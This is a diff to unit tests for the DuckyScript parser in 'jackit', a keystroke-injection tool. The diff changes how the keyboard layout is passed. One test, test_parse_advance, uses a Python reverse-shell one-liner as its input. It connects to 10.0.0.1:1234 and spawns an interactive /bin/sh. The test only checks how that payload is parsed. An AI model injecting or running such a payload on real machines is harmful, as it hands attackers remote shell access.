@@ -1,9 +1,9 @@
-from jackit import keymap, duckyparser
+from jackit import duckyparser
 
 
 def test_char_to_hid():
     '''basic test of char to hid '''
-    dp = duckyparser.DuckyParser("test", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("test", 'us')
     assert dp.char_to_hid('a') == [4, 0]
     assert dp.char_to_hid('A') == [4, 2]
     assert dp.char_to_hid('UP') == [82, 0]
@@ -13,7 +13,7 @@ def test_parse_repeat():
     dp = duckyparser.DuckyParser("""
 STRING Hello
 REPEAT 5
-""", keymap.mapping["us"])
+""", 'us')
     assert dp.parse() == [{'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                           {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                           {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
@@ -42,21 +42,21 @@ REPEAT 5
 
 
 def test_parse():
-    dp = duckyparser.DuckyParser("test", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("test", 'us')
     assert dp.parse() == []
 
-    dp = duckyparser.DuckyParser("GUI r\n", keymap.mapping["us"])
+    dp = duckyparser.DuckyParser("GUI r\n", 'us')
     assert dp.parse() == [{'char': 'r', 'hid': 21, 'sleep': 0, 'mod': 8}]
 
 
 def test_parse_arrowkeys():
-    dp = duckyparser.DuckyParser('UP', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('UP', 'us')
     assert dp.parse() == [{'char': 'UP', 'mod': 0, 'hid': 82, 'sleep': 0}]
-    dp = duckyparser.DuckyParser('DOWN', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('DOWN', 'us')
     assert dp.parse() == [{'char': 'DOWN', 'mod': 0, 'hid': 81, 'sleep': 0}]
-    dp = duckyparser.DuckyParser('LEFT', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('LEFT', 'us')
     assert dp.parse() == [{'char': 'LEFT', 'mod': 0, 'hid': 80, 'sleep': 0}]
-    dp = duckyparser.DuckyParser('RIGHT', keymap.mapping["us"])
+    dp = duckyparser.DuckyParser('RIGHT', 'us')
     assert dp.parse() == [{'char': 'RIGHT', 'mod': 0, 'hid': 79, 'sleep': 0}]
 
 
@@ -64,7 +64,7 @@ def test_parse_advance():
     dp = duckyparser.DuckyParser("""
 STRING python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
 ENTER
-    """, keymap.mapping["us"])
+    """, 'us')
     assert dp.parse() == [{'char': 'p', 'hid': 19, 'sleep': 0, 'mod': 0},
                           {'char': 'y', 'hid': 28, 'sleep': 0, 'mod': 0},
                           {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
